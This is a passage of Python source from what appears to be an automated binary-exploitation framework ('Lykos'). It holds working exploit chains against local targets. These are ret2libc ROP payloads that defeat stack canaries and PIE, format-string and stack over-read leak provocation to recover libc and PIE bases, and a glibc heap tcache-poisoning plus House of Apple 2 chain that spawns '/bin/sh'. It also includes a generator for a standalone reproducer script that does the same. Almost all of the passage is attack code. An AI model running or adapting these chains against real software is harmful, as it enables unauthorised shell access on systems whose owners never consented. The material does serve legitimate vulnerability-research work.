    All *_off are IMAGE offsets (relocated by the recovered PIE base) EXCEPT system_off / binsh_off /
    puts_libc_off, which are offsets in the loading libc. Confirmed by a spawned shell that echoes
    `marker`. Returns {ok, route, canary, pie_base, libc_base, system} or {ok: False, reason}."""
    import selectors as _selectors
    import struct as _struct

    from . import rop
    from ..fuzz import menu as _menu
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False

    def _spawn():
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                     chdir=(exedir if rel else "")) + [str(exe)] + argv
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                preexec_fn=preexec)

    def _shell_out(p, sel):
        try:
            time.sleep(0.2)
            p.stdin.write(b"echo " + marker + b"\n")
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return b""
        return _read_until(p, time.time() + timeout, quiet=1.2)

    last = {"ok": False, "reason": "PIE+canary ret2libc: no shell confirmed"}
    for skew in (0, 1, 2, 3, 4):                                  # absorb stdin residue (see ret2win)
        for align in (False, True):                              # movaps 16-byte alignment for system
            p = _spawn()
            try:
                sel = _selectors.DefaultSelector()
                sel.register(p.stdout, _selectors.EVENT_READ)
                if not leak_recipe:
                    _read_until(p, time.time() + 0.5)            # banner (single-trigger)
                canary, pie_base, libc_base, pos = _replay_over_read(
                    p, sel, leak_recipe=leak_recipe, canary_trigger=canary_trigger,
                    canary_index=canary_index, canary_regex=canary_regex, target_bytes=target_bytes,
                    libc_data=libc_data, timeout=timeout)
                if canary is None or not pie_base:
                    continue
                co = canary_offset if canary_offset is not None else pos
                ro = ret_offset if ret_offset is not None else ((pos + 16) if pos is not None else None)
                if co is None or ro is None:
                    continue
                co -= skew
                ro -= skew
                if co < 0 or ro < 0:
                    continue
                pre = rop.build_canary_prefix(co, canary, ro)
                ag = rop.find_gadget(target_bytes, "ret") if align else None
                align_w = q(pie_base + ag) if ag else b""

                if libc_base:                                    # --- one-shot: libc already leaked
                    payload = bytes(pre) + align_w + q(pie_base + pop_rdi_off) \
                        + q(libc_base + binsh_off) + q(libc_base + system_off)
                    try:
                        p.stdin.write(payload); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    out = _shell_out(p, sel)
                    if marker in out or b"/bin/sh" in out:
                        return {"ok": True, "route": "one-shot", "canary": canary, "pie_base": pie_base,
                                "libc_base": libc_base, "system": libc_base + system_off,
                                "output": out[:400].decode("latin-1", "ignore")}
                    last = {"ok": False, "reason": "one-shot ret2libc did not confirm a shell",
                            "pie_base": pie_base, "libc_base": libc_base}
                    continue

                # --- two-stage: leak libc with a canary-safe puts(GOT), then system on the re-entry
                if None in (puts_plt_off, puts_got_off, puts_libc_off, ret_to_off):
                    last = {"ok": False, "pie_base": pie_base,
                            "reason": "canary+PIE leaked, no libc in the over-read and no loop/puts "
                                      "offsets for a two-stage leak"}
                    continue
                s1 = bytes(pre) + q(pie_base + pop_rdi_off) + q(pie_base + puts_got_off) \
                    + q(pie_base + puts_plt_off) + q(pie_base + ret_to_off)
                try:
                    p.stdin.write(s1); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]
                if len(raw) < 6:
                    continue
                libc2 = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"),
                                              puts_libc_off)
                if not libc2:
                    last = {"ok": False, "pie_base": pie_base,
                            "reason": "two-stage: PIE base ok but the libc leak was unrecognised"}
                    continue
                # the loop re-runs the prompts: replay the WHOLE recipe (the benign answers AND the
                # leak fill) to land back on the overflow read -- the same navigation the leak used;
                # the re-fired over-read just prints again and is drained.
                if leak_recipe:
                    for step in leak_recipe:
                        _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + max(0.5, timeout / 3))
                        try:
                            p.stdin.write(bytes(step)); p.stdin.flush()
                        except (BrokenPipeError, OSError):
                            break
                    _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + timeout / 3)
                else:
                    try:
                        p.stdin.write(canary_trigger); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    _read_until(p, time.time() + 0.4)
                s2 = bytes(pre) + align_w + q(pie_base + pop_rdi_off) \
                    + q(libc2 + binsh_off) + q(libc2 + system_off)
                try:
                    p.stdin.write(s2); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                out = _shell_out(p, sel)
                if marker in out or b"/bin/sh" in out:
                    return {"ok": True, "route": "two-stage", "canary": canary, "pie_base": pie_base,
                            "libc_base": libc2, "system": libc2 + system_off,
                            "output": out[:400].decode("latin-1", "ignore")}
                last = {"ok": False, "reason": "two-stage ret2libc did not confirm a shell",
                        "pie_base": pie_base, "libc_base": libc2}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return last


def _allint(b):
    try:
        int(b, 16)
        return True
    except ValueError:
        return False


def _le_pointer_words(data: bytes, cap: int = 256) -> list:
    """Little-endian 8-byte words in `data` that look like an x86-64 userspace pointer: the top two
    bytes zero and the next byte 0x7f (libc/mmap/stack) or 0x55/0x56 (a PIE image mapping). A raw
    stack over-read (CWE-125) echoes memory as BINARY, not hex, so the saved return into
    __libc_start_main, environ/stack and PIE code pointers sit there as raw words -- harvesting them
    gives classify_leak the multiple corroborating pointers it needs to pin a base from an
    un-labelled leak. All byte offsets are scanned (a text prefix can push pointers off 8-byte
    alignment); spurious hits are filtered downstream by cross-pointer corroboration."""
    out = []
    for i in range(0, max(0, len(data) - 7)):
        if data[i + 6] == 0 and data[i + 7] == 0 and data[i + 5] in (0x7F, 0x55, 0x56):
            out.append(int.from_bytes(data[i:i + 8], "little"))
            if len(out) >= cap:
                break
    return out


def _case_fold_pointer_candidates(data: bytes, *, cap: int = 4096) -> list:
    """Candidate pointer VALUES recovered from a leak the viewer CASE-FOLDED on output (a `funkify`
    / toupper / tolower echo). A byte in [A-Za-z] loses its case, so a leaked pointer's letter bytes
    are ambiguous -- and crucially the image top byte 0x55 ('U') / 0x56 ('V') can arrive LOWERCASED
    as 0x75 ('u') / 0x76 ('v'), which `_le_pointer_words` (looking for 0x55/0x56/0x7f) would miss.

    For every 6-byte little-endian run whose top byte is 0x55/0x56/0x7f OR the case-folded 0x75/0x76,
    un-fold the top byte and enumerate the case variants of the lower-5 alpha bytes (the ambiguity),
    yielding each candidate address. A real pointer's page offset still matches a unique image anchor,
    so recover_pie_base(allow_single) / classify_leak pick the true one; the bogus case-variants fail
    corroboration. Bounded (<= 2**5 variants per run) so the brute stays tiny. Transform-agnostic: it
    does not need to know the exact fold rule, only that case was lost."""
    import itertools
    tops = {0x7F: 0x7F, 0x55: 0x55, 0x56: 0x56, 0x75: 0x55, 0x76: 0x56}
    out, seen = [], set()
    for i in range(0, max(0, len(data) - 5)):
        top = tops.get(data[i + 5])
        if top is None:
            continue
        low = data[i:i + 5]
        # per-byte case variants of the low 5 bytes (letters -> {upper, lower}); non-letters fixed
        choices = []
        for b in low:
            if 0x41 <= b <= 0x5A:
                choices.append((b, b + 0x20))
            elif 0x61 <= b <= 0x7A:
                choices.append((b, b - 0x20))
            else:
                choices.append((b,))
        nvar = 1
        for c in choices:
            nvar *= len(c)
        if nvar > 64:                                    # too ambiguous -> keep only the raw reading
            choices = [(c[0],) for c in choices]
        for combo in itertools.product(*choices):
            v = int.from_bytes(bytes(combo) + bytes([top]), "little")
            if v not in seen:
                seen.add(v)
                out.append(v)
            if len(out) >= cap:
                return out
    return out


# --- automatic leak classification + provocation (gap #2) ---------------------------------------
def _le_canary_words(data: bytes, cap: int = 64) -> list:
    """8-byte words in `data` shaped like a glibc stack canary -- low byte 0x00, the rest non-zero,
    and NOT a canonical pointer. A raw stack over-read leaks the canary as exactly such a word, which
    _le_pointer_words (pointer-shaped only) drops, so find_canary never saw it. Scanned at every byte
    offset (a text prefix shifts 8-byte alignment); a wrong candidate only makes the canary-writeback
    trip __stack_chk_fail, which fails the exploit safely rather than confirming a false L3."""
    out = []
    for i in range(0, max(0, len(data) - 7)):
        wb = data[i:i + 8]
        if wb[0] != 0 or wb[1] == 0:                      # NUL terminator low, byte 1 random-nonzero
            continue
        if sum(1 for b in wb if b) < 5:                   # a real canary is high-entropy (7 nonzero
            continue                                      # bytes); a shifted window has few -> reject
        w = int.from_bytes(wb, "little")
        if (0x550000000000 <= w <= 0x5FFFFFFFFFFF) or (0x7F0000000000 <= w <= 0x7FFFFFFFFFFF):
            continue                                      # a pointer that happens to end in 0x00
        out.append(w)
        if len(out) >= cap:
            break
    return out


def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
    """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
    the libc base (from libc's symbols, when a libc is given) and the stack canary, using ONLY the
    leak. Returns {pie_base, libc_base, canary} with None for whatever could not be corroborated.
    This removes the analyst's slot-picking WHEN the dump is rich enough (>=2 corroborating pointers
    for a base; a null-low-byte word for the canary); a sparse dump still yields None and falls back
    to an analyst-supplied slot."""
    from . import rop
    from .exploit import recover_pie_base
    return {
        "pie_base": recover_pie_base(vals, target_bytes),
        "libc_base": rop.recover_libc_base(vals, libc_data) if libc_data else None,
        "canary": rop.find_canary(vals),
    }


def _gate_preambles(target_bytes=b"", strings=(), known_inputs=(), cap=6) -> list:
    """Candidate byte strings that pass a program's INPUT GATE, so a leak trigger sent AFTER them
    actually reaches the leaking sink.

    A leak behind a gate -- `strstr(input, "TOKEN")`, a required banner reply, a password/menu
    prompt -- is never reached when the trigger is the first thing written: the program rejects it
    and exits before the leaking printf / over-read, so the provocation silently fails on exactly
    the interactive targets that most need it (e.g. a `strstr(input,"TOKEN")`
    gate guards the `printf("...%s", input)` that discloses the stack). Mined from (1) known
    gate-passing inputs the pipeline already found -- the leading printable run of a concolic/fuzz
    crash input that reached the bug -- and (2) the binary's own selective strings, since a gate
    token is almost always a literal in the image. Deduped and bounded; each is tried as the start
    of a leak trigger (a single write, for a gate that reads the whole line) by the caller."""
    import re as _re
    out: list = []
    seen: set = set()

    def _add(b: bytes):
        b = bytes(b).rstrip(b"\x00")
        if b and b not in seen and 2 <= len(b) <= 64:
            seen.add(b)
            out.append(b)

    for ki in known_inputs or ():                        # leading printable run of a solved input
        run = bytearray()
        for ch in bytes(ki):
            if 0x20 <= ch < 0x7f:
                run.append(ch)
            else:
                break
        if len(run) >= 2:
            _add(bytes(run))
    svals = list(strings or ())
    if not svals and target_bytes:                       # fall back to the image's own strings
        svals = [m.group(0).decode("latin-1") for m in _re.finditer(rb"[ -~]{3,48}", target_bytes)]
    for s in svals:
        s = (s if isinstance(s, str) else s.decode("latin-1", "ignore")).strip()
        # a plausible gate token: wordy, not a format/path/flag fragment
        if 3 <= len(s) <= 48 and any(c.isalpha() for c in s) \
                and not s.startswith(("%", "/", "-", ".")) and "%" not in s:
            _add(s.encode("latin-1", "ignore"))
        if len(out) >= cap:
            break
    return out[:cap]


def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
                      mem_mb=2048, read_cap=64, strings=(), known_inputs=(),
                      drive_prompts=False) -> dict:
    """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
    fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
    the classification plus the winning trigger, or empties when nothing was disclosed (the target
    has no format-string sink, or none reachable). Pure provocation -- a target with no printf(user)
    just echoes the specifier as text and classify_leak finds nothing."""
    import re as _re
    hexrx = _re.compile(rb"0x[0-9a-fA-F]+")
    exedir = str(Path(exe).resolve().parent)
    # Sequential dump sized to the read, then a few positional probes for deep code/libc pointers.
    seq = b"%p" + b".%p" * max(1, (read_cap - 4) // 3)
    # `b""` FIRST: classify the target's OWN output with no provocation. Many real programs disclose a
    # pointer through normal flow -- a diagnostic that prints `&main`/an object address, an error that
    # echoes a heap/libc pointer, a status line. That is a usable ASLR-defeating leak with no
    # format-string sink at all, and the old harness threw the pre-trigger banner away and only ever
    # classified a %p dump. The format-string provocations follow for a printf(user) sink.
    triggers = [b""]
    triggers += [seq[:read_cap] + b"\n"]
    triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
                 for a in (7, 19, 31)]
    # Over-read / uninitialized-print provocation (CWE-125): FILL the input buffer with non-NUL bytes
    # so a following over-long or unbounded output primitive -- write(fd,buf,BIG), puts, fwrite,
    # printf("%s",buf) -- echoes the stack PAST the buffer (saved rbp, canary, a return into PIE code,
    # libc pointers) as RAW little-endian words that `_le_pointer_words` harvests. This is the common
    # leak with no printf(user) sink at all. Sent WITHOUT a trailing newline so a raw read(fd,buf,N)
    # returns the moment the buffer is full; several sizes cover the unknown buffer length.
    triggers += [b"A" * n for n in (64, 128, 256)]
    # Gate-aware variants: prefix the over-read fills and the %p dump with each candidate gate
    # token, so the SAME input both passes an input gate (strstr(input,"TOKEN"), a banner reply)
    # and provokes the leak -- the sink behind the gate is otherwise never reached. The leaking
    # sink usually operates on this very input (printf("...%s", input)), so a single write suffices.
    for g in _gate_preambles(target_bytes, strings=strings, known_inputs=known_inputs):
        triggers += [g + b"A" * n for n in (64, 128, 256)]
        triggers.append((g + seq)[:read_cap] + b"\n")
    best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
    for trig in triggers:
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
            [str(exe)] + [str(a) for a in base_argv]
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception:                                    # noqa: BLE001
            continue
        try:
            # The pre-trigger banner is the target's OWN output -- keep it (a natural leak lives
            # here), don't discard it. For the empty trigger we classify the banner alone; otherwise
            # we fold it into the provoked dump so a natural pointer is seen even alongside a %p sink.
            banner = _read_until(p, time.time() + (timeout / 2 if not trig else 0.4))
            if trig:
                try:
                    p.stdin.write(trig)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                dump = banner + _read_until(p, time.time() + timeout / 2)
            else:
                dump = banner
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    if s is not None:
                        s.close()
                except Exception:                            # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                pass
        # Harvest pointers two ways. (1) HEX TEXT: a %p dump or a diagnostic that prints an address.
        # (2) RAW LITTLE-ENDIAN WORDS: a stack over-read (the common CWE-125) echoes binary memory,
        # not hex -- the saved return into __libc_start_main, environ/stack pointers, PIE code
        # pointers all sit there as raw 8-byte words. Scanning them gives classify_leak the MULTIPLE
        # corroborating pointers it needs to pin a base from an un-labelled leak. A plausible x86-64
        # userspace pointer is 0x0000_7fxx_xxxx_xxxx (libc/mmap/stack) or 0x0000_55/56xx (PIE image).
        vals = [int(m.group(0), 16) for m in hexrx.finditer(dump) if _allint(m.group(0))]
        vals += _le_pointer_words(dump)
        vals += _le_canary_words(dump)                   # canary isn't pointer-shaped -> harvest it
        cls = classify_leak(vals, target_bytes, libc_data)
        # keep the richest result (most fields recovered)
        score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
        if score > sum(best[k] is not None for k in ("pie_base", "libc_base", "canary")):
            best = {**cls, "trigger": trig, "dump": dump[:400]}
        if cls["libc_base"] and cls["canary"]:              # enough to finish most chains
            best = {**cls, "trigger": trig, "dump": dump[:400]}
            break
    # Fallback for a leak behind a TYPED prompt sequence: the single-write triggers above fail when
    # the program reads several typed inputs (a number, a name) before the leaking sink -- a generic
    # fill fails a scanf("%d") and the program aborts before the leak. Drive the prompts, answering
    # each by its classified type, and inject the over-read at one input. Lazy import avoids the
    # interaction<->leak cycle. OPT-IN (drive_prompts) and gated to a MULTI-READ target, because the
    # prompt sweep spawns many processes -- the normal single-read exploit ladder must not pay it;
    # only a hardened, prompt-gated path (the canary/PIE leak path) asks for it.
    if (drive_prompts and not (best.get("canary") or best.get("pie_base") or best.get("libc_base"))):
        try:
            from .. import interaction
            if len(interaction.read_sizes(target_bytes)) < 2:
                return best                                  # single-read: first-write path suffices
            d = interaction.drive_to_leak(exe, workdir, target_bytes, libc_data,
                                          base_argv=base_argv, timeout=timeout)
            if d.get("canary") or d.get("pie_base") or d.get("libc_base"):
                best = {"pie_base": d.get("pie_base"), "libc_base": d.get("libc_base"),
                        "canary": d.get("canary"), "trigger": b"", "recipe": d.get("recipe"),
                        "dump": b"", "inject_at": d.get("inject_at")}
        except Exception:                                    # noqa: BLE001 -- fallback is best-effort
            pass
    return best


def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, system_off,
                       poison_size=0x300, guard_size=0x430, width=None) -> bytes:
    """A self-contained, stdlib-based reproducer for the automated glibc-heap -> shell chain
    (unsorted-bin libc leak -> tcache-fd heap leak -> tcache poison of _IO_2_1_stdout_ -> House of
    Apple 2 -> system("/bin/sh")). ASLR-dependent, so no static input can exist -- the libc base and
    heap page are recovered live; only the libc OFFSETS (measured at build time) are embedded. The
    menu is driven with the same op templates, field width and leak extraction the exploit used, so
    the shipped reproducer replays exactly what was confirmed (line-based OR fixed-width fields, and
    a view that prints a prompt before the raw chunk bytes)."""
    ops = {k: (v if isinstance(v, str) else v.decode("latin-1")) for k, v in menu_ops.items()}
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: glibc heap -> shell (tcache poison + House of Apple 2). Authorized-use only.\n"
        "import os, select, struct, subprocess, sys, time\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
        f"OPS={ops!r}\n"
        f"WIDTH={int(width) if width else None!r}   # fixed-width read(fd,buf,W) fields, or None (lines)\n"
        f"UNSORTED_OFF={unsorted_off:#x}; STDOUT_OFF={stdout_off:#x}; "
        f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
        f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
        "SIZES={}\n"
        "def render(t, idx=None, size=None, data=b'', dsize=None):\n"
        "    def sub(s):\n"
        "        if idx is not None: s=s.replace('{idx}',str(idx))\n"
        "        if size is not None: s=s.replace('{size}',str(size))\n"
        "        return s\n"
        "    if WIDTH:   # each scalar padded to WIDTH bytes, the data buffer NUL-padded to its chunk size\n"
        "        out=b''\n"
        "        for f in t.split('\\n'):\n"
        "            if not f: continue\n"
        "            if f=='{data}': out+=bytes(data).ljust(dsize,b'\\x00')[:dsize] if dsize else bytes(data)\n"
        "            else: out+=(sub(f).encode()+b' '*WIDTH)[:WIDTH]\n"
        "        return out\n"
        "    head, sep, tail = t.partition('{data}')\n"
        "    out=sub(head).encode()\n"
        "    if sep: out+=bytes(data)+sub(tail).encode()\n"
        "    return out\n"
        "def ADD(i,s,d): SIZES[i]=s; return render(OPS['add'],i,s,d,dsize=s)\n"
        "def FREE(i): return render(OPS['free'],i)\n"
        "def VIEW(i): return render(OPS['view'],i)\n"
        "def EDIT(i,d): return render(OPS['edit'],i,data=d,dsize=SIZES.get(i))\n"
        "EXIT=render(OPS['exit_seq'])\n"
        "def read_until(p, deadline, quiet=0.2):\n"
        "    out=b''; last=time.time()\n"
        "    while time.time()<deadline:\n"
        "        r,_,_=select.select([p.stdout],[],[],0.1)\n"
        "        if r:\n"
        "            c=os.read(p.stdout.fileno(),4096)\n"
        "            if not c: break\n"
        "            out+=c; last=time.time()\n"
        "        elif p.poll() is not None: break\n"
        "        elif out and (time.time()-last)>quiet: break\n"
        "    return out\n"
        "def hoa2(write_addr, wfile_jumps, system, command=b' /bin/sh'):\n"
        "    b=bytearray(b'\\x00'*0x300)\n"
        "    def w(o,v): b[o:o+8]=struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "    b[0:len(command)]=command\n"
        "    w(0x28,1); w(0x88,write_addr+0x2a0); w(0xa0,write_addr+0xe0); w(0xd8,wfile_jumps)\n"
        "    w(0xe0+0x30,0); w(0xe0+0xe0,write_addr+0x200); w(0x200+0x68,system)\n"
        "    return bytes(b)\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def op(seq,secs=0.35):\n"
        "    p.stdin.write(seq); p.stdin.flush(); return read_until(p, time.time()+secs)\n"
        "def windows(o):   # 8-byte pointer candidates; pure-ASCII windows are prompt text\n"
        "    for i in range(max(0,len(o)-7)):\n"
        "        w=o[i:i+8]\n"
        "        if all(b==0 or 0x20<=b<=0x7e for b in w): continue\n"
        "        yield i, struct.unpack('<Q',w)[0]\n"
        "read_until(p, time.time()+0.5)\n"
        "op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
        "vo=op(VIEW(0),0.5); base=None; off=0\n"
        "for i,v in windows(vo):   # the page-aligned main_arena fd; its offset = where raw bytes begin\n"
        "    if v<(1<<47) and v-UNSORTED_OFF>0 and (v-UNSORTED_OFF)%0x1000==0: base=v-UNSORTED_OFF; off=i; break\n"
        "assert base, 'libc leak failed: %s'%vo[:32].hex()\n"
        "stdout_addr=base+STDOUT_OFF\n"
        "op(ADD(2,POISON,b'C')); op(ADD(3,POISON,b'D')); op(FREE(2))\n"
        "ho=op(VIEW(2),0.5); heap=0\n"
        "if len(ho)>=off+8:   # the safe-linked fd sits at the same offset as the libc fd did\n"
        "    c=struct.unpack('<Q',ho[off:off+8])[0]\n"
        "    if 0<c<(1<<40): heap=c\n"
        "if not heap: heap=next((v for _,v in windows(ho) if 0<v<(1<<40)),0)\n"
        "assert heap, 'heap leak failed'\n"
        "op(ADD(2,POISON,b'C')); op(FREE(3)); op(FREE(2))\n"
        "op(EDIT(2, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(4,POISON,b'E'))\n"
        "blob=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
        "op(ADD(5,POISON,blob[:POISON]))\n"
        "p.stdin.write(EXIT); p.stdin.flush(); time.sleep(0.3)\n"
        "p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
        "out=read_until(p, time.time()+8, quiet=1.5)\n"
        "if b'PWNED-LYKOS' in out or b'uid=' in out:\n"
        "    print('shell (libc base %#x, heap %#x):'%(base,heap)); print(out.decode('latin-1','ignore')); sys.exit(0)\n"
        "sys.stderr.write('heap -> shell did not confirm\\n'); sys.exit(1)\n"
    ).encode()


# --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
                      poison_size=0x300, guard_size=0x430, marker=b"LYKOS-HEAP-9931",
                      timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
    """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
    House of Apple 2. Composes the pieces lykos already has (menu model, safe-linking, FSOP):

      1. libc leak  -- free a large chunk (skips tcache -> unsorted bin, its fd points into libc);
         view it; `base = leaked - unsorted_off` (main_arena+0x60 for the target's glibc).
      2. heap leak  -- free a tcache chunk and view its fd == chunk>>12 (safe-linking key; the low
         bits are not needed, mangle only XORs the page).
      3. poison     -- with two freed tcache chunks, edit the head's fd to mangle(chunk, stdout);
         two allocations then hand back a chunk AT `_IO_2_1_stdout_`.
      4. FSOP       -- write build_house_of_apple2 into that chunk, then `exit_seq` flushes the
         corrupted stdout -> system("/bin/sh").

    The four ops are supplied as callables that render the target's own menu input:
    `add(idx,size,data)->bytes`, `free(idx)->bytes`, `view(idx)->bytes`, `edit(idx,data)->bytes`;
    `exit_seq` triggers a flush. Confirmed by a spawned shell echoing `marker`. Returns
    {ok, libc_base, heap_page, ...}."""
    import struct as _struct

    from . import heap as _heap
    from . import rop
    T = _heap.house_of_apple2_targets(libc_data)
    if not T:
        return {"ok": False, "reason": "libc lacks _IO_2_1_stdout_/_IO_wfile_jumps/system"}
    exedir = str(Path(exe).resolve().parent)
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 4, set_as=True)
    cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:                               # noqa: BLE001
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    def _op(seq, read_secs=0.35):
        try:
            p.stdin.write(seq)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return b""
        return _read_until(p, time.time() + read_secs, quiet=0.2)

    def _windows(out):
        """(offset, value) for each 8-byte little-endian window of a view's output that could be a
        POINTER. A real menu may print a prompt ("idx: ", "Content: ") before the raw chunk bytes, so
        the pointer is not necessarily at offset 0. A window whose non-zero bytes are all printable
        ASCII is prompt text, never a pointer (a pointer carries a non-printable byte), so skip it."""
        for i in range(max(0, len(out) - 7)):
            win = out[i:i + 8]
            if all(b == 0 or 0x20 <= b <= 0x7e for b in win):
                continue
            yield i, _struct.unpack("<Q", win)[0]

    try:
        _read_until(p, time.time() + 0.5)
        # 1) libc leak via the unsorted bin: the first window resolving to a PAGE-ALIGNED libc base is
        #    the main_arena fd. A window straddling the prompt cannot pass that guard (its low byte is
        #    ASCII, never main_arena's low byte), so the match offset is exactly where this view's raw
        #    chunk bytes begin past any prompt -- the calibration step 2 reuses.
        _op(add(0, guard_size, b"A"))
        _op(add(1, guard_size, b"B"))               # guard: stops back-consolidation with the top
        _op(free(0))
        vout = _op(view(0), 0.5)
        data_off, base = 0, None
        for i, v in _windows(vout):
            if v < (1 << 47):
                base = rop.resolve_libc_base(v, unsorted_off)
                if base:
                    data_off = i
                    break
        if not base:
            return {"ok": False, "reason": f"libc leak failed (dump {vout[:32].hex()})"}
        stdout_addr = base + T["stdout"]
        # 2) heap leak via a freed tcache chunk's safe-linked fd == chunk2>>12. The fd sits at the
        #    SAME offset in this view's output as the libc fd did (same view op, same prompts), so read
        #    it there rather than guessing where a prompt ends -- a non-PIE heap page is tiny (~0x405)
        #    and indistinguishable by value from a misaligned prompt-straddling window. Fall back to a
        #    scan only when the calibrated word is implausible (prompt timing shifted the output).
        _op(add(2, poison_size, b"C"))
        _op(add(3, poison_size, b"D"))
        _op(free(2))
        hout = _op(view(2), 0.5)
        heap_page = 0
        if len(hout) >= data_off + 8:
            cand = _struct.unpack("<Q", hout[data_off:data_off + 8])[0]
            if 0 < cand < (1 << 40):
                heap_page = cand
        if not heap_page:
            heap_page = next((v for _, v in _windows(hout) if 0 < v < (1 << 40)), 0)
        if not heap_page:
            return {"ok": False, "reason": f"heap leak failed (dump {hout[:32].hex()})"}
        _op(add(2, poison_size, b"C"))               # take chunk2 back; tcache empty for this size
        # 3) poison: free two, mangle the head's fd to _IO_2_1_stdout_
        _op(free(3))
        _op(free(2))
        _op(edit(2, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
        _op(add(4, poison_size, b"E"))               # returns chunk2
        # 4) the next allocation lands on _IO_2_1_stdout_; write the House of Apple 2 FILE there
        blob = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
                                           system=base + T["system"])
        _op(add(5, poison_size, blob[:poison_size]))
        # trigger the flush -> FSOP -> shell, then confirm
        try:
            p.stdin.write(exit_seq)
            p.stdin.flush()
            time.sleep(0.3)
            # Lead with a newline: a FIXED-WIDTH exit_seq is padded to exactly W bytes and carries NO
            # newline (that is what the target's read(fd,buf,W) expects), so without this the spawned
            # shell's first line is "5<pad>echo <marker>" -- the marker becomes an argument to a bogus
            # command and never echoes, failing the confirmation on an exploit that actually worked.
            p.stdin.write(b"\necho " + marker + b"\n")
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
        out = _read_until(p, time.time() + timeout, quiet=1.5)
        if marker in out:
            return {"ok": True, "libc_base": base, "heap_page": heap_page,
                    "stdout": stdout_addr, "output": out[:400].decode("latin-1", "ignore")}
        return {"ok": False, "reason": "no shell confirmed", "libc_base": base,
                "output": out[:200].decode("latin-1", "ignore")}
    finally:
        for s in (p.stdin, p.stdout):
            try:
                if s is not None:
                    s.close()
            except Exception:                           # noqa: BLE001
                pass
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:                               # noqa: BLE001
            pass
